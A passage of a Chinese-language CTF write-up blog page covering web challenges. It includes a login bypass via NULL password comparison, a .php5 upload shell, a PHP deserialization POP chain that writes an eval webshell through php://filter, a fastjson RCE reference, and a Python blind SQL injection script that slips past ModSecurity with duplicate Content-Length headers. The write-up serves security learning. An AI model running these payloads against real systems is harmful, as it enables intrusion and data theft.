+<p>mysql没有查到记录时,<code>$dpasswd===NULL</code><br>此时令<code>$password===NULL</code>即<code>$_POST[&#39;password&#39;]===NULL</code>,则成功登陆</p>
+<p>登陆后进入上传界面,测试发现,后端校验文件头和content-type<br>过滤php后缀名,上传.php5文件,成功拿到shell</p>
+<p>拿到flag:flag{logical_bypass_not_weak_password}</p>
+<h2 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h2><p>n day json bypass disable_function</p>
+<h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $expire = <span class="string">'8888'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $cache = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $autosave = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $complete = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = <span class="keyword">new</span> B();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = <span class="string">'hi.php'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache = [<span class="string">'path'</span>=&gt;<span class="string">'a'</span>,<span class="string">'dirname'</span>=&gt;base64_encode(<span class="string">'&lt;?php eval($_GET[a]);   ?'</span>.<span class="string">'&gt; '</span>)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $options = [</span><br><span class="line">        <span class="string">'serialize'</span> =&gt; <span class="string">'serialize'</span>,</span><br><span class="line">        <span class="string">'prefix'</span> =&gt; <span class="string">'php://filter/write=convert.base64-decode/resource=uploads/'</span>,</span><br><span class="line">        <span class="string">'data_compress'</span> =&gt; <span class="keyword">false</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $writeTimes = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">'http://111.186.57.61:10401/?data='</span> . urlencode(serialize(<span class="keyword">new</span> A())));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'====='</span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="ezjjava"><a href="#ezjjava" class="headerlink" title="ezjjava"></a>ezjjava</h2><p>fastjson 1.2.47 RCE<br><a href="https://github.com/CaijiOrz/fastjson-1.2.47-RCE" target="_blank" rel="noopener">https://github.com/CaijiOrz/fastjson-1.2.47-RCE</a></p>
+<h2 id="ezwaf"><a href="#ezwaf" class="headerlink" title="ezwaf"></a>ezwaf</h2><p>参考之前 RoarCTF 中畸形包绕 modsecurity  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    </span><br><span class="line">    res = <span class="string">'flag&#123;abypass_modsecurity'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>, <span class="number">50</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">            payload = <span class="string">'''GET /?age=1%20or%201%20and%20ascii(substr((select%20*%20from%20flag_xdd),&#123;&#125;,1))=&#123;&#125;%20and%20sleep(0.7) HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 111.186.57.43:10601</span></span><br><span class="line"><span class="string">Content-Length: 0</span></span><br><span class="line"><span class="string">Content-Length: 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span>.format(str(i), str(j))</span><br><span class="line">            exp = payload.encode().replace(<span class="string">b'\n'</span>, <span class="string">b'\r\n'</span>)</span><br><span class="line">            <span class="comment"># print(exp)</span></span><br><span class="line">            <span class="keyword">if</span> send_raw(exp):</span><br><span class="line">                res += chr(j)</span><br><span class="line">                print(res)</span><br><span class="line">                <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2019/11/19/hacknote/" rel="next" title="hacknote">
+                  <i class="fa fa-chevron-left"></i> hacknote
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2019/11/23/╧Ω╜ΓUnLink/" rel="prev" title="详解UnLink">
+                  详解UnLink <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Inhaltsverzeichnis
+        </li>
+        <li class="sidebar-nav-overview">
+          Übersicht
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">1.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-misc1"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 misc1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-misc2"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 misc2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-misc3"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 misc3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-webshell"><span class="nav-number">1.4.</span> <span class="nav-text">0x03 webshell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#re"><span class="nav-number">2.</span> <span class="nav-text">re</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#re1"><span class="nav-number">2.1.</span> <span class="nav-text">re1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#re2"><span class="nav-number">2.2.</span> <span class="nav-text">re2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#crypto"><span class="nav-number">3.</span> <span class="nav-text">crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#rsa1"><span class="nav-number">3.1.</span> <span class="nav-text">rsa1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AES"><span class="nav-number">3.2.</span> <span class="nav-text">AES</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">4.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ezupload"><span class="nav-number">4.1.</span> <span class="nav-text">ezupload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezbypass"><span class="nav-number">4.2.</span> <span class="nav-text">ezbypass</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezpop"><span class="nav-number">4.3.</span> <span class="nav-text">ezpop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezjjava"><span class="nav-number">4.4.</span> <span class="nav-text">ezjjava</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezwaf"><span class="nav-number">4.5.</span> <span class="nav-text">ezwaf</span></a></li></ol></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ZERO-A-ONE</p>
+  <div class="site-description" itemprop="description">Resit much,Obey little</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">71</span>
+          <span class="site-state-item-name">Artikel</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">Kategorien</span>
+        
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ZERO-A-ONE</span>
+</div>
+  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.0</div>
+
+<div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv" style='display:none'>
+    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    <span class="post-meta-divider">|</span>
+</span>
+<span id="busuanzi_container_site_uv" style='display:none'>
+    有<span id="busuanzi_value_site_uv"></span>人看过我的博客啦
+</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+
+
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
